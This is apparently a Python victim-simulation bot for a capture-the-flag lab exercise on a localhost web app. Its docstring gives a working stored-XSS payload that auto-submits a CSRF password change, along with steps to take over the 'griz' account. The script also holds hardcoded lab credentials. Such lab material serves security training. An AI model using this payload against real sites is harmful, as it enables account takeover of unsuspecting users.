#!/usr/bin/env python3
"""
Bot for FLAG 11 — Stored XSS + CSRF Password Change
Simulates the griz bot visiting /messages while logged in every 30 seconds forever.

Attack steps:
1. Post this payload in /messages (logged in as any user):

      <form id='x' action='http://127.0.0.1:5000/settings' method='POST'>
        <input type='hidden' name='new_password' value='hacked'>
      </form>
      <script>document.getElementById('x').submit()</script>

2. Run this bot — it logs in as griz and visits /messages every 30s.
3. The XSS fires, auto-submitting the form and changing griz's password.
4. Log in as griz with password 'hacked' and visit /profile for FLAG 11.

Note: once the password has been changed the bot will fail to log in on
subsequent visits — that is expected and confirms the attack worked.
"""

import urllib.request
import urllib.parse
import http.cookiejar
import time

TARGET   = "http://127.0.0.1:5000"
USERNAME = "griz"
PASSWORD = "funkysax123"
INTERVAL = 30


def make_opener():
    jar    = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    opener.addheaders = [("User-Agent", "Mozilla/5.0 (DropZoneBot/1.0)")]
    return opener, jar


def login(opener):
    data = urllib.parse.urlencode({
        "username": USERNAME,
        "password": PASSWORD,
    }).encode()
    resp = opener.open(f"{TARGET}/login", data)
    return resp.geturl() != f"{TARGET}/login"


def visit_messages(opener):
    opener.open(f"{TARGET}/messages")


def run():
    count = 0
    print(f"[*] CSRF Bot starting — target: {TARGET}")
    print(f"[*] Logging in as '{USERNAME}' and visiting /messages every {INTERVAL}s forever")
    print(f"[*] Make sure your CSRF payload is already posted to /messages\n")

    while True:
        count += 1
        opener, jar = make_opener()

        print(f"[{count}] Logging in as griz...", end=" ", flush=True)
        if login(opener):
            print("OK")
            print(f"[{count}] Visiting /messages — CSRF payload should fire if present...")
            visit_messages(opener)
            print(f"[{count}] Done\n")
        else:
            print(f"FAILED — griz's password may already have been changed by the attack")
            print(f"         Try logging in as griz with your new password and visit /profile\n")

        print(f"[*] Sleeping {INTERVAL}s...\n")
        time.sleep(INTERVAL)


if __name__ == "__main__":
    run()